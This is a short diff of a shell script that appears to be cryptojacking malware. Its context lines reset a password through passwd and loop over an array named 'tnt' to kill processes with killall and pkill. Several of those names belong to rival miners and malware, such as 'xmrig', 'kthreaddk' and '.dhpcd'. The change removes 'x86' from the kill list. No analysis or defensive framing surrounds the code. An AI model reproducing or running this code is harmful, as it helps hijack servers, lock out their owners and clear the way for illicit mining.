@@ -10,7 +10,7 @@ else
     echo -e "$pass\n$pass" | passwd
 fi
 
-tnt=("krn" "kthreaddk" "cosynus" "python" "python3" "ip" ".dhpcd" "syste3md" "xmrig" 'zzh' "screen" "boner" "x86" "perl" "dropbear")
+tnt=("krn" "kthreaddk" "cosynus" "python" "python3" "ip" ".dhpcd" "syste3md" "xmrig" 'zzh' "screen" "boner" "perl" "dropbear")
 for i in ${tnt[@]}; do
     killall $i
     pkill -f $i
